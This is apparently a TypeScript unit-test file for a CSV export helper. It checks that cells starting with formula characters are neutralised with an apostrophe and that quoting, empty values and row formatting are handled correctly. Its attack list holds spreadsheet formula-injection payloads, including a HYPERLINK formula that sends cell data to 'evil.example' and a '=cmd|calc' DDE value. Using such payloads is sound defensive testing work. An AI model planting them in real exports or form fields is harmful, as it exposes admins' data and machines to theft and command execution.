import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { csvCell, toCsv } from './csv.ts';

describe('csvCell: formula injection', () => {
  // A malicious entrant can sign up with any of these as their "email" and the
  // admin opens the export in Excel.
  const attacks = [
    '=1+1',
    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
  ];

  test('prefixes every formula-triggering cell with an apostrophe', () => {
    for (const attack of attacks) {
      const cell = csvCell(attack);
      assert.equal(cell.startsWith(`"'`), true, `not neutralised: ${JSON.stringify(attack)}`);
    }
  });

  test('leaves ordinary values untouched', () => {
    assert.equal(csvCell('alice@example.com'), '"alice@example.com"');
    assert.equal(csvCell('O’Brien'), '"O’Brien"');
    assert.equal(csvCell(42), '"42"');
    assert.equal(csvCell('2026-10-18T20:00:00.000Z'), '"2026-10-18T20:00:00.000Z"');
  });

  test('does not mangle a value that merely contains an operator', () => {
    assert.equal(csvCell('a=b'), '"a=b"');
    assert.equal(csvCell('first-last@example.com'), '"first-last@example.com"');
  });
});

describe('csvCell: quoting', () => {
  test('doubles embedded quotes', () => {
    assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  });

  test('keeps commas and newlines inside the quoted field', () => {
    assert.equal(csvCell('Smith, Jane'), '"Smith, Jane"');
    assert.equal(csvCell('line1\nline2'), '"line1\nline2"');
  });

  test('renders null and undefined as empty', () => {
    assert.equal(csvCell(null), '""');
    assert.equal(csvCell(undefined), '""');
  });
});

describe('toCsv', () => {
  test('writes a BOM, CRLF rows and a trailing newline', () => {
    const csv = toCsv(['email', 'entries'], [['alice@example.com', 1]]);
    assert.equal(csv.startsWith('﻿'), true, 'missing UTF-8 BOM');
    assert.equal(csv, '﻿"email","entries"\r\n"alice@example.com","1"\r\n');
  });

  test('handles an empty row set', () => {
    assert.equal(toCsv(['a', 'b'], []), '﻿"a","b"\r\n');
  });

  test('neutralises an attack carried in a data row', () => {
    const csv = toCsv(['email'], [['=cmd|calc']]);
    assert.equal(csv.includes(`"'=cmd|calc"`), true);
  });
});
